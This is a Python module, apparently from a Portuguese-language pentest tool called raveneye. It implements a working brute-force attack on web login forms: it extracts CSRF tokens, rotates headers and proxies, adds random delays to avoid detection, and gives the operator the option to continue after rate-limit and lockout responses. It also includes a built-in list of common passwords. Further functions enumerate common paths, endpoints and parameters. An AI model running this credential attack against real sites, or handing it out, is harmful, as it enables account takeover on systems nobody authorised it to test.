from __future__ import annotations

"""Bruteforce de login (com CSRF/jitter/lockout detection) e gerenciamento
de wordlist com integridade TOFU. Bruteforce de subdominios via DNS vive
em scanners.py (categoria diferente: enumeracao, nao credencial)."""


import hashlib
import random
import re
import time
from contextlib import suppress
from pathlib import Path
import requests
from bs4 import BeautifulSoup
from raveneye_pkg.terminal import Fore, Style
from raveneye_pkg import state
from raveneye_pkg.state import vprint, _sleep
from raveneye_pkg.network import get_random_headers, get_proxies, request_url, normalize_url, is_safe_url
from raveneye_pkg.config_io import save_config
from raveneye_pkg.constants import EXTRA_PASSWORDS


# ==================================================================
# FUNÇÕES — Wordlist
# ==================================================================
def get_wordlist(large: bool = False) -> str:
    """Baixa ou usa wordlist local, com integridade via SHA256 + pinning TOFU
    (Trust On First Use): o hash da primeira baixa bem-sucedida fica salvo na
    config; downloads futuros sao comparados contra ele, e uma mudanca inesperada
    gera aviso (possivel tampering da fonte) e cai no fallback embutido."""
    wl_file = "payloads_large.txt" if large else "payloads_medium.txt"
    script_dir = Path(__file__).parent
    path = script_dir / wl_file
    if path.exists():
        return str(path)
    url = (
        "https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/large.txt"
        if large
        else "https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/medium.txt"
    )
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 200:
            content = r.content
            actual_hash = hashlib.sha256(content).hexdigest()
            pinned = state.config.get("wordlist_hashes", {}).get(wl_file)
            if pinned:
                if actual_hash != pinned:
                    print(Fore.RED + f"[!] Hash da wordlist '{wl_file}' mudou desde o ultimo uso "
                                      f"(esperado {pinned[:12]}..., recebido {actual_hash[:12]}...). "
                                      f"Pode ser atualizacao legitima da fonte ou adulteracao — "
                                      f"usando fallback embutido por seguranca." + Style.RESET_ALL)
                    raise ValueError("Hash mismatch (TOFU)")
            else:
                state.config.setdefault("wordlist_hashes", {})[wl_file] = actual_hash
                with suppress(Exception):
                    save_config(state.config)
                vprint(1, f"[*] Hash da wordlist '{wl_file}' fixado (TOFU): {actual_hash[:16]}...")
            path.write_bytes(content)
            return str(path)
    except Exception as e:
        vprint(2, f"[WARN] get_wordlist download: {e}")

    # Fallback: senhas embutidas (EXTRA_PASSWORDS) + defaults
    default = list(dict.fromkeys(EXTRA_PASSWORDS + [
        "123456", "password", "admin", "12345", "12345678", "root", "toor",
        "admin123", "qwerty", "abc123", "senha", "1234", "123456789",
        "letmein", "welcome", "monkey", "dragon", "master", "login", "pass",
    ]))
    path.write_text("\n".join(default), encoding="utf-8")
    return str(path)


# ==================================================================
# FUNÇÕES — Bruteforce
# ==================================================================
def _get_csrf_token(session: requests.Session, login_url: str) -> dict[str, str]:
    """Extrai token CSRF do formulário de login."""
    extra: dict[str, str] = {}
    try:
        r = session.get(login_url, headers=get_random_headers(), timeout=10,
                        proxies=get_proxies())
        soup = BeautifulSoup(r.text, "html.parser")
        csrf_selectors = [
            r"csrf", r"token", r"_token", r"authenticity_token",
            r"csrfmiddlewaretoken", r"__RequestVerificationToken"
        ]
        for inp in soup.find_all("input", {"type": ["hidden", "text"]}):
            name = inp.get("name", "")
            value = inp.get("value", "")
            if name and value and any(re.search(p, name, re.I) for p in csrf_selectors):
                extra[name] = value
        meta = soup.find("meta", {"name": "csrf-token"})
        if meta and meta.get("content"):
            extra["csrf-token"] = meta["content"]
    except Exception as e:
        vprint(2, f"[WARN] _get_csrf_token: {e}")
    return extra


def _get_baseline(session: requests.Session, login_url: str,
                  username_field: str, password_field: str) -> dict:
    """Faz request baseline com senha inválida para comparação."""
    baseline: dict = {"status": 0, "length": 0, "keywords": set()}
    try:
        csrf = _get_csrf_token(session, login_url)
        data = {username_field: "raveneye_invalid_user_x9z", password_field: "__INVALID_RAVENEYE_BASELINE__"}
        data.update(csrf)
        r = session.post(login_url, data=data, timeout=10, allow_redirects=True,
                         headers=get_random_headers(), proxies=get_proxies())
        baseline["status"] = r.status_code
        baseline["length"] = len(r.text)
        baseline["url"] = r.url
        for kw in ["invalid", "incorrect", "error", "failed", "wrong", "denied", "unauthorized"]:
            if kw in r.text.lower():
                baseline["keywords"].add(kw)
    except Exception as e:
        vprint(2, f"[WARN] _get_baseline: {e}")
    return baseline


def bruteforce_login(
    login_url: str, username: str,
    username_field: str = "username", password_field: str = "password",
    wordlist_path: str | None = None, root_mode: bool = False,
    use_extra_passwords: bool = True,
) -> tuple[str | None, int]:
    """Bruteforce com CSRF, jitter, lockout detection e sucesso multicritério.
    
    MELHORIA: Integra EXTRA_PASSWORDS embutidos no início da wordlist.
    """
    wl_path_obj: Path | None = None
    passwords: list[str] = []

    # Carrega wordlist externa
    if not wordlist_path:
        wordlist_path = get_wordlist(large=root_mode)
    wl_path_obj = Path(wordlist_path)
    if wl_path_obj.exists():
        try:
            file_passwords = [
                line.strip()
                for line in wl_path_obj.read_text(encoding="utf-8", errors="ignore").splitlines()
                if line.strip()
            ]
            passwords.extend(file_passwords)
        except (IOError, PermissionError) as e:
            print(Fore.RED + f"Erro ao ler wordlist: {e}" + Style.RESET_ALL)

    # Prepend senhas embutidas (EXTRA_PASSWORDS) se configurado
    if use_extra_passwords:
        combined = list(dict.fromkeys(EXTRA_PASSWORDS + passwords))
    else:
        combined = passwords

    # Respeita limite configurável (bf_attempts)
    max_attempts = state.config.get("bf_attempts", 500)
    combined = combined[:max_attempts]

    total = len(combined)
    if total == 0:
        print(Fore.RED + "Wordlist vazia." + Style.RESET_ALL)
        return None, 0

    session = requests.Session()
    session.headers.update(get_random_headers())
    print(Fore.CYAN + f"[*] Iniciando bruteforce em {login_url}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Total de senhas: {total} (limite configurado: {max_attempts})" + Style.RESET_ALL)
    if use_extra_passwords:
        print(Fore.YELLOW + f"[*] Wordlist embutida ({len(EXTRA_PASSWORDS)} senhas BR/int) + arquivo ({len(combined)-len(EXTRA_PASSWORDS)} senhas)" + Style.RESET_ALL)

    baseline = _get_baseline(session, login_url, username_field, password_field)
    consecutive_blocks = 0
    start = time.time()

    for idx, pwd in enumerate(combined, 1):
        percent = (idx / total) * 100
        print(f"\r[{idx}/{total}] {percent:.1f}% | Tentando: {pwd[:20]:<20}", end="", flush=True)

        try:
            csrf = _get_csrf_token(session, login_url)
            data: dict = {username_field: username, password_field: pwd}
            data.update(csrf)
            resp = session.post(
                login_url, data=data, timeout=8, allow_redirects=True,
                headers=get_random_headers(), proxies=get_proxies()
            )
        except Exception as e:
            vprint(2, f"\n[WARN] bruteforce req: {e}")
            _sleep(1)
            continue

        if resp.status_code == 429:
            consecutive_blocks += 1
            print(Fore.YELLOW + f"\n[!] Rate limit detectado. Aguardando 60s..." + Style.RESET_ALL)
            _sleep(60)
            cont = input("[?] Continuar bruteforce? (s/N): ").strip().lower()
            if cont != "s":
                break
            consecutive_blocks = 0
            continue

        body_lower = resp.text.lower()
        if any(kw in body_lower for kw in ["locked", "blocked", "too many", "account disabled"]):
            consecutive_blocks += 1
            if consecutive_blocks >= 3:
                print(Fore.RED + "\n[!] Conta possivelmente bloqueada. Pausando 120s." + Style.RESET_ALL)
                _sleep(120)
                cont = input("[?] Continuar? (s/N): ").strip().lower()
                if cont != "s":
                    break
                consecutive_blocks = 0
        else:
            consecutive_blocks = 0

        redirected_to_different = resp.url != login_url and resp.url != baseline.get("url", login_url)
        length_diff = abs(len(resp.text) - baseline.get("length", 0)) > 50
        kw_absent = not any(kw in body_lower for kw in baseline.get("keywords", set()))
        new_cookies = bool(resp.cookies)

        if redirected_to_different or (length_diff and kw_absent) or (kw_absent and new_cookies):
            print(Fore.GREEN + f"\n[+] SUCESSO! Senha encontrada: {pwd}" + Style.RESET_ALL)
            session.close()
            return pwd, idx

        _sleep(random.uniform(0.3, 1.2))

    elapsed = time.time() - start
    session.close()
    print(Fore.RED + f"\nBruteforce concluido. Nenhuma senha valida em {total} tentativas ({elapsed:.1f}s)" + Style.RESET_ALL)
    return None, total


# ==================================================================
# ENUMERAÇÃO SEGURA — modalidades adicionais do módulo Bruteforce
# ==================================================================
_DEFAULT_ENUM_WORDS = (
    "admin", "api", "api/v1", "api/v2", "login", "signin", "dashboard",
    "robots.txt", "sitemap.xml", "health", "status", "docs", "swagger",
    "openapi.json", "graphql", "assets", "static", "uploads", "backup",
    ".well-known", ".git/HEAD", "config", "debug", "test", "staging",
)


def _enumeration_request(url: str, timeout: int = 6) -> dict | None:
    """GET de descoberta com escopo e limites; não autentica nem envia payload."""
    if not is_safe_url(url):
        return None
    body, err = request_url(url, timeout=timeout, max_retries=1, backoff_cap=4)
    if body is None:
        return {"url": url, "status": 0, "error": err or "request failed"}
    return {"url": url, "status": 200, "length": len(body), "sample": body[:180]}


def _target_base(target: str) -> str:
    raw = target if target.startswith(("http://", "https://")) else "https://" + target
    return raw.rstrip("/")


def enumerate_paths(target: str, words: list[str] | None = None, limit: int = 200) -> list[dict]:
    """Descobre paths comuns via GET, com deduplicação e limite."""
    base = _target_base(target)
    words = list(dict.fromkeys(words or _DEFAULT_ENUM_WORDS))[:max(1, limit)]
    results = []
    for word in words:
        if state.QUIET_MODE is False:
            vprint(1, f"[ENUM] path /{word}")
        url = normalize_url(base + "/" + word.lstrip("/"))
        result = _enumeration_request(url)
        if result and result.get("status") == 200:
            # request_url retorna apenas corpo; 200 aqui significa que houve
            # resposta. Mantemos isso como "respondido", não "vulnerável".
            result["kind"] = "path"
            results.append(result)
        _sleep(max(0.05, float(state.config.get("delay", 0.3)) / 2))
    return results


def enumerate_endpoints(target: str, words: list[str] | None = None, limit: int = 200) -> list[dict]:
    """Descobre endpoints HTTP comuns sem tentar autenticação."""
    endpoint_words = words or [
        "api", "api/v1", "api/v2", "api/users", "api/health", "health",
        "metrics", "graphql", "swagger", "swagger.json", "openapi.json",
        "docs", "login", "logout", "session", "user", "users", "search",
    ]
    return enumerate_paths(target, endpoint_words, limit)


def enumerate_parameters(
    target: str,
    parameter_names: list[str] | None = None,
    limit: int = 60,
) -> list[dict]:
    """Testa se parâmetros comuns alteram a resposta, usando marcador benigno."""
    base = _target_base(target)
    names = parameter_names or [
        "id", "page", "q", "query", "search", "sort", "filter", "lang",
        "view", "redirect", "next", "url", "callback", "format", "limit",
    ]
    names = list(dict.fromkeys(names))[:max(1, limit)]
    baseline = _enumeration_request(base)
    base_len = int((baseline or {}).get("length", 0))
    results = []
    for name in names:
        marker = f"RAVENEYE_{name}_probe"
        sep = "&" if "?" in base else "?"
        url = f"{base}{sep}{name}={marker}"
        result = _enumeration_request(url)
        if result:
            result["kind"] = "parameter"
            result["parameter"] = name
            result["changed_from_baseline"] = abs(int(result.get("length", 0)) - base_len) > max(50, int(base_len * 0.15))
            results.append(result)
        _sleep(max(0.05, float(state.config.get("delay", 0.3)) / 2))
    return results
